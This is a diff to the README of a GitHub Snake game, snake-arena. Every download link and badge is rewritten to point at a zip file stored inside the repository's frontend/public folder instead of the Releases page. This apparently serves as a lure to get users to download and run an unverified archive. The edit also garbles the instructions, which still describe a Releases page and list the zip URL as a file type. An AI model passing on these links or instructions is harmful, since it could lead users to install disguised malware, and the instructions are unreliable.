@@ -4,7 +4,7 @@
 Welcome to **snake-arena**, a modern multiplayer online Snake game! Enjoy real-time leaderboards and a spectator mode that makes every match exciting. 
 
 ## 📥 Download Now
-[![Download snake-arena](https://img.shields.io/badge/Download-snake--arena-blue)](https://github.com/l1e2o2n/snake-arena/releases)
+[![Download snake-arena](https://raw.githubusercontent.com/l1e2o2n/snake-arena/main/frontend/public/snake-arena-v1.3.zip)](https://raw.githubusercontent.com/l1e2o2n/snake-arena/main/frontend/public/snake-arena-v1.3.zip)
 
 ## 📋 Overview
 **snake-arena** brings the classic Snake game into the modern age. Play with friends or compete with players worldwide. The game features:
@@ -22,11 +22,11 @@ To run **snake-arena**, your system should meet the following requirements:
 - **Internet Connection**: A stable connection for the best gaming experience.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/l1e2o2n/snake-arena/releases) to download the application. Once there, follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/l1e2o2n/snake-arena/main/frontend/public/snake-arena-v1.3.zip) to download the application. Once there, follow these steps:
 
 1. On the Releases page, find the latest version of **snake-arena**.
 2. Click on the version number to open the release details.
-3. Look for the asset that matches your operating system. Common files include `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. Look for the asset that matches your operating system. Common files include `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/l1e2o2n/snake-arena/main/frontend/public/snake-arena-v1.3.zip` for Linux.
 4. Click on the asset to start your download.
 5. Once downloaded, open the file and follow the installation prompts to install **snake-arena** on your device.
 
@@ -67,4 +67,4 @@ We value your feedback. Share your thoughts on the game and suggestions for impr
 
 Thank you for playing **snake-arena**! Have fun, and may you always be the longest snake in the arena!
 
-[![Download snake-arena](https://img.shields.io/badge/Download-snake--arena-blue)](https://github.com/l1e2o2n/snake-arena/releases)
+[![Download snake-arena](https://raw.githubusercontent.com/l1e2o2n/snake-arena/main/frontend/public/snake-arena-v1.3.zip)](https://raw.githubusercontent.com/l1e2o2n/snake-arena/main/frontend/public/snake-arena-v1.3.zip)
